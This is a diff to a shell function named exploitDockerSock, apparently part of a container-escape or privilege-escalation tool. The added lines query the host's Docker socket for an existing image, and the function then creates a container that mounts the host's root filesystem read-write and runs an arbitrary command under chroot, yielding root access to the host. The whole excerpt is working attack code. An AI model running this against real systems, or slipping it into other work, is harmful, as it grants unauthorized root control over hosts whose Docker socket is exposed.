@@ -1052,9 +1052,18 @@ exploitDockerSock() {
 
   nl
 
+  # Try to find an available docker image
+  json_data=$(curl -s --unix-socket /var/run/docker.sock http://localhost/images/json)
+  docker_img=$(echo "$json_data" | grep -o '"RepoTags":\["[^"]*' | grep -o '[^"]*$' | tail -1)
+
+  if [ -z "$docker_img" ]; then
+    printInfo 'No avaliable docker image found, using alpine'
+    docker_img="alpine" 
+  fi 
+
   # Create docker container using the docker sock
   payload="[\"/bin/sh\",\"-c\",\"chroot /mnt sh -c \\\"$cmd\\\"\"]"
-  response=$(curl -s -XPOST --unix-socket /var/run/docker.sock -d "{\"Image\":\"alpine\",\"cmd\":$payload, \"Binds\": [\"/:/mnt:rw\"]}" -H 'Content-Type: application/json' http://localhost/containers/create)
+  response=$(curl -s -XPOST --unix-socket /var/run/docker.sock -d "{\"Image\":\"$docker_img\",\"cmd\":$payload, \"Binds\": [\"/:/mnt:rw\"]}" -H 'Content-Type: application/json' http://localhost/containers/create)
 
   if ! [ $? ]; then
     printError 'Something went wrong'
